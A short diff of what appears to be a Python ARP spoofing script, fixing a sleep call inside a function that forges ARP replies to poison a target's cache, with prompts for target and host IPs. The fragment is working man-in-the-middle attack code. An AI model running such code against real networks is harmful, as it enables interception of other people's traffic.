@@ -19,7 +19,7 @@ def arp_spoofing(spoof, target):
     mac = get_mac(target)
     spoofing_packet = ARP(op=2, pdst=target, hwdst=mac, psrc=spoof)
     send (spoofing_packet, verbose=False)
-    time.sleep = 3
+    time.sleep(3)
     
 target_ip = input("Target IP: ")
 host_ip = input("Host IP: ")
